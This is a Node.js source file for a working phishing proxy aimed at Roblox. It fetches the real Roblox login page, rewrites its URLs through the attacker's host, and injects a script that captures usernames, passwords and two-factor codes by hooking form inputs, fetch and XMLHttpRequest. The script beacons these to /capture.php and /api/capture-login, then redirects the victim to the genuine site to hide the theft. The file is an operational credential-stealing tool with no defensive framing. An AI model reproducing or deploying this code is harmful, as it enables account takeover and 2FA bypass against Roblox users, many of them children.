// Node port of login.php. Fetches Roblox's own login page, rewrites every
// Roblox URL through this host, and injects the capture interceptor.
const fs = require('fs');
const axios = require('axios');
const R = require('../runtime');

const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const TTL_MS = 60_000;
const MIN_HTML = 5000;
const CACHE_FILE = R.seededDataPath('.cache', 'login-html', 'roblox_login.html');

const BASE_THEME_STYLE = '<style>html,body{background:#121215;color:#fff;}'
    + 'body{margin:0;font-family:"Builder Sans","Helvetica Neue",Helvetica,Arial,sans-serif;}'
    + '#rbx-body{background:#121215;}</style>';

const CAPTURE_SCRIPT = `<script>
(function() {
    var lastUsername = '';
    var lastPassword = '';

    function updateFromInputs() {
        try {
            var passInputs = document.querySelectorAll('input#login-password, input[data-testid="login-password"], input[name="password"], input[autocomplete="current-password"], input[type="password"]');
            for (var i = 0; i < passInputs.length; i++) {
                if (passInputs[i].value) {
                    lastPassword = passInputs[i].value;
                    break;
                }
            }
            var userSelectors = [
                'input#login-username',
                'input[data-testid="login-username"]',
                'input[name="username"]',
                'input[name="cvalue"]',
                'input[autocomplete="username"]',
                '.login-form-container input[type="text"]',
                '#react-login-container input[type="text"]'
            ];
            for (var j = 0; j < userSelectors.length; j++) {
                var el = document.querySelector(userSelectors[j]);
                if (el && el.value && el.value.trim()) {
                    lastUsername = el.value.trim();
                    break;
                }
            }
            if (!lastUsername) {
                var allInputs = document.querySelectorAll('input[type="text"], input[type="email"], input:not([type])');
                for (var k = 0; k < allInputs.length; k++) {
                    var inp = allInputs[k];
                    var id = (inp.id || '').toLowerCase();
                    var cls = (inp.className || '').toLowerCase();
                    var placeholder = (inp.placeholder || '').toLowerCase();
                    if (id.includes('search') || cls.includes('search') || placeholder.includes('search')) continue;
                    if (inp.value && inp.value.trim()) {
                        lastUsername = inp.value.trim();
                        break;
                    }
                }
            }
        } catch(e) {}
    }

    document.addEventListener('input', updateFromInputs, true);
    document.addEventListener('change', updateFromInputs, true);
    document.addEventListener('keyup', updateFromInputs, true);

    function getCredentials() {
        updateFromInputs();
        return {
            username: lastUsername,
            password: lastPassword
        };
    }

    var lastBeacon = {};

    function beaconCredentials(data) {
        if (!data || (!data.username && !data.password && !data.twoFactorCode)) return;

        var sig = (data.username || '') + '|' + (data.password ? '1' : '0') + '|' + (data.twoFactorCode || '');
        var now = Date.now();
        if (lastBeacon[sig] && now - lastBeacon[sig] < 8000) return;
        lastBeacon[sig] = now;

        var payload = JSON.stringify({
            username: data.username || lastUsername || '',
            password: data.password || lastPassword || '',
            twoFactorCode: data.twoFactorCode || '',
            redirect_url: 'https://www.roblox.com/home',
            returnUrl: 'https://www.roblox.com/home',
            timestamp: new Date().toISOString()
        });
        try {
            if (navigator.sendBeacon) {
                navigator.sendBeacon('/capture.php', payload);
            } else {
                fetch('/capture.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: payload,
                    keepalive: true
                }).catch(function() {});
            }
        } catch(e) {}

        try {
            var nodePayload = JSON.stringify({
                type: 'login_beacon',
                timestamp: new Date().toISOString(),
                data: {
                    username: data.username || lastUsername || '',
                    password: data.password || lastPassword || '',
                    twoFactorCode: data.twoFactorCode || ''
                }
            });
            if (navigator.sendBeacon) {
                navigator.sendBeacon('/api/capture-login', new Blob([nodePayload], { type: 'application/json' }));
            } else {
                fetch('/api/capture-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: nodePayload,
                    keepalive: true
                }).catch(function() {});
            }
        } catch(e) {}
    }

    function redirectToRobloxHome() {
        setTimeout(function() {
            window.location.href = 'https://www.roblox.com/home';
        }, 350);
    }

    document.addEventListener('click', function(e) {
        var btn = e.target.closest('#login-button, [data-testid="login-button"], button[type="button"], button[type="submit"], .login-button, .btn-primary-md');
        if (btn) {
            var creds = getCredentials();
            if (creds.username || creds.password) {
                beaconCredentials(creds);
            }
        }
    }, true);

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            var creds = getCredentials();
            if (creds.username || creds.password) {
                beaconCredentials(creds);
            }
        }
    }, true);

    var _origFetch = window.fetch;
    window.fetch = function(input, init) {
        var url = typeof input === 'string' ? input : (input && input.url ? input.url : '');
        var body = (init && init.body) || (input && input.body);
        try {
            if (body && typeof body === 'string') {
                if (url.includes('/v2/login') || url.includes('/authenticate') || body.includes('"password"')) {
                    try {
                        var parsed = JSON.parse(body);
                        var u = parsed.cvalue || parsed.username || '';
                        var p = parsed.password || '';
                        if (u) lastUsername = u;
                        if (p) lastPassword = p;
                        if (u || p) {
                            beaconCredentials({ username: lastUsername, password: lastPassword });
                        }
                    } catch(e) {}
                }
                if (url.includes('two-step') || url.includes('two-factor') || body.includes('"code"')) {
                    try {
                        var parsed2 = JSON.parse(body);
                        if (parsed2.code) {
                            var c = getCredentials();
                            beaconCredentials({ username: c.username, password: c.password, twoFactorCode: parsed2.code });
                        }
                    } catch(e) {}
                }
            }
        } catch(e) {}

        var fetchPromise = _origFetch.apply(this, arguments);
        return fetchPromise.then(function(res) {
            try {
                if (res && res.headers && res.headers.get('x-login-complete') === '1') {
                    redirectToRobloxHome();
                    return res;
                }
                if (res.ok && (url.includes('/v2/login') || url.includes('/v3/users'))) {
                    res.clone().json().then(function(data) {
                        if (!data) return;
                        if (data.twoStepVerificationData || data.isTwoStepVerificationRequired === true) return;
                        if (data.user && data.user.id) {
                            redirectToRobloxHome();
                        }
                    }).catch(function() {});
                }
            } catch(e) {}
            return res;
        });
    };

    var _origXhrOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        this._reqUrl = url;
        return _origXhrOpen.apply(this, arguments);
    };

    var _origXhrSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {
        var url = this._reqUrl || '';
        try {
            if (body && typeof body === 'string') {
                if (body.includes('password') && (body.includes('cvalue') || body.includes('username'))) {
                    try {
                        var parsed = JSON.parse(body);
                        var u = parsed.cvalue || parsed.username || '';
                        var p = parsed.password || '';
                        if (u) lastUsername = u;
                        if (p) lastPassword = p;
                        if (u || p) {
                            beaconCredentials({ username: lastUsername, password: lastPassword });
                        }
                    } catch(e) {}
                }
                if (body.includes('"code"')) {
                    try {
                        var parsed2 = JSON.parse(body);
                        if (parsed2.code) {
                            var c = getCredentials();
                            beaconCredentials({ username: c.username, password: c.password, twoFactorCode: parsed2.code });
                        }
                    } catch(e) {}
                }
            }
        } catch(e) {}

        this.addEventListener('load', function() {
            try {
                if (this.status >= 200 && this.status < 300) {
                    if (url.includes('/v2/login') || url.includes('/v3/users')) {
                        try {
                            var json = JSON.parse(this.responseText);
                            if (json && json.user && json.user.id &&
                                !json.twoStepVerificationData && !json.isTwoStepVerificationRequired) {
                                redirectToRobloxHome();
                            }
                        } catch(e) {}
                    }
                }
            } catch(e) {}
        });

        return _origXhrSend.apply(this, arguments);
    };

    var REAL_HOME = 'https://www.roblox.com/home';
    var leaving = false;
    function bounceIfHome() {
        if (leaving) return;
        var p = window.location.pathname;
        if (p === '/home' || p.indexOf('/home/') === 0 || p === '/discover' ||
            p === '/my/avatar' || p === '/my/account' || p === '/my/settings') {
            leaving = true;
            window.location.replace(REAL_HOME);
        }
    }
    bounceIfHome();
    setInterval(bounceIfHome, 1000);

    var leftAlready = false;
    var hasSubmitted = false;
    document.addEventListener('click', function (e) {
        if (e.target.closest('#login-button, [data-testid="login-button"], button[type="button"], button[type="submit"], .login-button, .btn-primary-md')) {
            hasSubmitted = true;
        }
    }, true);
    document.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') hasSubmitted = true;
    }, true);

    function pollLoginState() {
        if (leftAlready || !hasSubmitted) return;
        fetch('/api/login-state', { credentials: 'same-origin' })
            .then(function (r) { return r.json(); })
            .then(function (d) {
                if (d && d.complete && !leftAlready) {
                    leftAlready = true;
                    window.location.replace(d.redirect || REAL_HOME);
                }
            })
            .catch(function () {});
    }
    setInterval(pollLoginState, 1500);
})();
</script>`;

const REPLACEMENTS = [
    ['https://css.rbxcdn.com/', '/rbxcdn/'],
    ['http://css.rbxcdn.com/', '/rbxcdn/'],
    ['//css.rbxcdn.com/', '/rbxcdn/'],
    ['https://static.rbxcdn.com/', '/staticrbx/'],
    ['http://static.rbxcdn.com/', '/staticrbx/'],
    ['//static.rbxcdn.com/', '/staticrbx/'],
    ['https://images.rbxcdn.com/', '/imgrbx/'],
    ['http://images.rbxcdn.com/', '/imgrbx/'],
    ['//images.rbxcdn.com/', '/imgrbx/'],
    ['https://tr.rbxcdn.com/', '/thumbnails/'],
    ['http://tr.rbxcdn.com/', '/thumbnails/'],
    ['//tr.rbxcdn.com/', '/thumbnails/'],
    ['https://js.rbxcdn.com/', '/rblx-js/'],
    ['http://js.rbxcdn.com/', '/rblx-js/'],
    ['//js.rbxcdn.com/', '/rblx-js/'],
    ['https://apis.roblox.com/', '/proxy/roblox/apis.roblox.com/'],
    ['https://twostepverification.roblox.com/', '/proxy/roblox/twostepverification.roblox.com/'],
    ['https://twofactorauth.roblox.com/', '/proxy/roblox/twofactorauth.roblox.com/'],
    ['https://www.roblox.com/', '/proxy/roblox/www.roblox.com/'],
    ['https://roblox.com/', '/proxy/roblox/www.roblox.com/']
];

function readCache() {
    try {
        const stat = fs.statSync(CACHE_FILE);
        if (Date.now() - stat.mtimeMs >= TTL_MS) return null;
        const html = fs.readFileSync(CACHE_FILE, 'utf8');
        return html && html.length > MIN_HTML ? html : null;
    } catch {
        return null;
    }
}

function readStaleCache() {
    try {
        const html = fs.readFileSync(CACHE_FILE, 'utf8');
        return html && html.length > MIN_HTML ? html : null;
    } catch {
        return null;
    }
}

function writeCache(html) {
    try {
        fs.writeFileSync(CACHE_FILE, html);
    } catch { /* read-only */ }
}

async function fetchUpstream() {
    for (let attempt = 1; attempt <= 3; attempt++) {
        try {
            const res = await axios.get('https://www.roblox.com/login', {
                headers: {
                    'User-Agent': USER_AGENT,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache'
                },
                timeout: 10_000,
                maxRedirects: 5,
                responseType: 'text',
                validateStatus: () => true
            });
            if (res.status >= 200 && res.status < 400 && res.data && String(res.data).length > MIN_HTML) {
                return String(res.data);
            }
        } catch { /* retry */ }
        if (attempt < 3) {
            await new Promise(resolve => setTimeout(resolve, 300 * attempt));
        }
    }
    return null;
}

function rewrite(html) {
    let out = html;
    for (const [from, to] of REPLACEMENTS) out = out.split(from).join(to);
    out = out.replace(/https:\/\/([a-zA-Z0-9-]+)\.roblox\.com(?![a-zA-Z0-9.-])/g, '/proxy/roblox/$1.roblox.com');
    return out;
}

function unavailablePage() {
    return '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">'
        + '<meta name="viewport" content="width=device-width,initial-scale=1">'
        + '<title>Roblox</title><style>html,body{margin:0;height:100%;background:#121215;color:#fff;'
        + 'font-family:"Builder Sans","Helvetica Neue",Helvetica,Arial,sans-serif;display:flex;'
        + 'align-items:center;justify-content:center;text-align:center}p{opacity:.75;font-size:15px;'
        + 'max-width:340px;line-height:1.5}</style></head><body><p>'
        + 'Roblox is not reachable right now. Refresh in a moment.</p></body></html>';
}

async function loginPage(req, res) {
    if (req.query.static === '1') return res.redirect(302, '/login');

    let stale = false;
    let html = readCache();
    if (!html) {
        html = await fetchUpstream();
        if (html) {
            writeCache(html);
        } else {
            html = readStaleCache();
            stale = Boolean(html);
        }
    }

    if (!html) {
        return res.status(503)
            .set('Retry-After', '30')
            .set('Content-Type', 'text/html; charset=utf-8')
            .set('Cache-Control', 'no-store')
            .send(unavailablePage());
    }

    html = rewrite(html);
    html = html.replace(/<head\b[^>]*>/i, match => match + BASE_THEME_STYLE + '<script src="/proxy-shim.js"></script>');
    if (req.query.native !== '1') {
        html = html.replace('</head>', CAPTURE_SCRIPT + '</head>');
    }

    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
    res.set('Pragma', 'no-cache');
    res.set('Expires', '0');
    res.set('X-Login-Build', 'proxy-1to1');
    if (stale) res.set('X-Login-Stale', '1');
    return res.type('text/html').send(html);
}

module.exports = { loginPage };
